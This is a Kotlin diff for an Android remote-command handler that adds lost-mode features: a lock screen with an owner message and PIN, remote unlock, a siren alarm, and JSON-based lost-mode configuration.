@@ -137,11 +137,62 @@ class RemoteCommandManager(private val context: Context) {
                     val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS)
                     resultMessage = if (res) "Expanded Quick Settings." else "Accessibility Service disabled."
                 }
-                "GLOBAL_LOCK_SCREEN", "LOCK_SCREEN", "LOCK" -> {
-                    val res = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                        RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN)
-                    } else false
-                    resultMessage = if (res) "Executed Remote Lock Screen." else "Accessibility Service disabled or unsupported Android version."
+                "GLOBAL_LOCK_SCREEN", "LOCK_SCREEN", "LOCK", "LOCK_DEVICE", "LOST_MODE", "LOCK_WITH_MESSAGE" -> {
+                    var customMsg: String? = null
+                    var ownerPhone: String? = null
+                    var unlockPin: String? = null
+
+                    val trimmed = payload.trim()
+                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
+                        try {
+                            val json = JSONObject(trimmed)
+                            customMsg = json.optString("message").ifEmpty { json.optString("msg").ifEmpty { null } }
+                            ownerPhone = json.optString("phone").ifEmpty { json.optString("contact").ifEmpty { null } }
+                            unlockPin = json.optString("pin").ifEmpty { null }
+                        } catch (_: Exception) {}
+                    }
+                    if (customMsg == null && trimmed.isNotEmpty() && !trimmed.startsWith("{")) {
+                        customMsg = trimmed
+                    }
+
+                    resultMessage = LostModeManager.lockDeviceWithCustomMessage(context, customMsg, ownerPhone, unlockPin)
+                }
+                "UNLOCK_DEVICE", "REMOTE_UNLOCK", "UNLOCK_MODE", "CLEAR_LOST_MODE", "UNLOCK" -> {
+                    val trimmed = payload.trim()
+                    val unlocked = if (trimmed.isEmpty() || trimmed.lowercase() in listOf("force", "remote", "true", "yes", "clear")) {
+                        LostModeManager.forceUnlockDevice(context)
+                    } else {
+                        LostModeManager.unlockDevice(context, trimmed)
+                    }
+                    resultMessage = if (unlocked) "Device unlocked remotely and Lost Mode cleared." else "Unlock failed: Incorrect PIN parameter provided."
+                    if (!unlocked) isSuccess = false
+                }
+                "START_SIREN", "SIREN_ON", "ALARM_ON", "TRIGGER_SIREN", "PLAY_SIREN", "ALARM" -> {
+                    LostModeManager.triggerSiren(context, true)
+                    resultMessage = "Loud siren alarm triggered remotely on device."
+                }
+                "STOP_SIREN", "SIREN_OFF", "ALARM_OFF", "MUTE_SIREN", "STOP_ALARM" -> {
+                    LostModeManager.triggerSiren(context, false)
+                    resultMessage = "Siren alarm stopped remotely."
+                }
+                "UPDATE_LOST_CONFIG", "SET_LOST_CONFIG" -> {
+                    val trimmed = payload.trim()
+                    if (trimmed.startsWith("{") && trimmed.endsWith("}")) {
+                        try {
+                            val json = JSONObject(trimmed)
+                            val msg = json.optString("message").ifEmpty { json.optString("msg", "") }
+                            val phone = json.optString("phone").ifEmpty { json.optString("contact", "") }
+                            val pin = json.optString("pin", "")
+                            LostModeManager.saveConfig(context, msg, phone, pin)
+                            resultMessage = "Updated Lost Mode remote configuration successfully."
+                        } catch (e: Exception) {
+                            resultMessage = "Failed to parse lost config JSON: ${e.message}"
+                            isSuccess = false
+                        }
+                    } else {
+                        resultMessage = "Payload must be JSON e.g. {\"message\":\"Lost\",\"phone\":\"+1234567890\",\"pin\":\"1234\"}"
+                        isSuccess = false
+                    }
                 }
                 "GLOBAL_POWER_DIALOG", "POWER_DIALOG", "POWER_MENU", "POWER", "REBOOT", "SHUTDOWN", "POWER_OFF" -> {
                     val res = RemoteAccessibilityService.performAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG)
